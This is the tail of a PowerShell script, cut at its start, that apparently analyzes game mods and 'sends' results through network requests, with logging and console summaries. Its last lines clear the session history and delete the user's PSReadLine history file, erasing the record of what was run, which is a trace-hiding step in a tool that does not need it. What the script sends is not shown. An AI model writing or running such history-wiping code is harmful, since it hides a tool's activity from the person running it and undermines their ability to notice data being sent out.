    }

    # ---------------- console wrap up ----------------
    Write-Host ("Mods analyzed: {0}" -f $Scanned) -ForegroundColor DarkGray
    if ($script:Fails -gt 0) {
        Write-Host ("Sent with {0} failed request(s) - log: {1}" -f $script:Fails, $LogPath) -ForegroundColor Yellow
    } else {
        Write-Host "Done." -ForegroundColor Green
    }
}
catch {
    Log ("unhandled: " + $_.Exception.Message) "fail"
    Write-Host ""
    Write-Host ("Error: " + $_.Exception.Message) -ForegroundColor Red
    Write-Host ("Log: " + $LogPath) -ForegroundColor DarkGray
}

Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()